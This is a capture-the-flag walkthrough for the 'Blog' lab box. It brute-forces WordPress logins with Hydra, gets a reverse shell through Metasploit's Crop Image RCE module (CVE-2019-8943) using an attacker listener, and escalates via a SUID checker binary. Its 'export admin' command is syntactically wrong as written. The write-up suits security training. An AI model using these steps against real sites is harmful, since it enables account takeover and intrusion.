# [Blog](https://tryhackme.com/room/blog)

## Billy Joel made a Wordpress blog!

# Blog

## Billy Joel made a blog on his home computer and has started working on it. It's going to be so awesome! Enumerate this box and find the 2 flags that are hiding on it! Billy has some weird things going on his laptop. Can you maneuver around and get what you need? Or will you fall down the rabbit hole...

### root.txt

1. Add target to hosts file for proper domain resolution

```bash
echo '<TARGET_IP> blog.thm' >> /etc/hosts
```

2. Initial port scan to identify running services

```bash
nmap <TARGET_IP>
```

[SCREEN01]

3. Navigate to `http://blog.thm` and examine the WordPress site. Check for user enumeration via author pages
   - Found two WordPress users: `bjoel` and `kwheel`
   - Performed brute force attack against both account using Hydra
   - Successfully obtained credentials: `kwheel:cutiepie1`

```bash
hydra -l kwheel -P /root/Tools/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

[SCREEN03]

4. After gaining WordPress admin access with kwheel's credentials, exploit the WordPress Crop Image RCE vulnerability (CVE-2019-8943) to gain reverse shell access

```bash
msfconsole
use exploit/multi/http/wp_crop_rce
set LHOST <ATTACKER_IP>
set RHOST <TARGET_IP>
set USERNAME kwheel
set PASSWORD cutiepie1
exploit
```

5. Search for SUID binaries to discover a custom checker program that can be exploited for privilege escalation

```bash
find / -perm -u=s -type f 2>/dev/null
cd /var/www/wordpress
export admin = '1'
checker
```

6. Retrieve root flag

```bash
cat /root/root.txt
```

---

### user.txt

1. The user flag is located in an unusual location - mounted USB drive rather than the typical home directory

```bash
cat /home/bjoel/user.txt
cat /media/usb/user.txt
```

---

### Where was user.txt found?

1. The user.txt flag was discovered in `/media/usb/` directory

```bash
find / -type f -name 'user.txt' 2>/dev/null
```

---

### What CMS was Billy using?

### What version of the above CMS was being used?

1. Examining the source code of `http://blog.thm/wp-login.php` reveals version information in meta tags and resource URLs
   - **CMS:** WordPress
   - **Version:** 5.0

[SCREEN02]
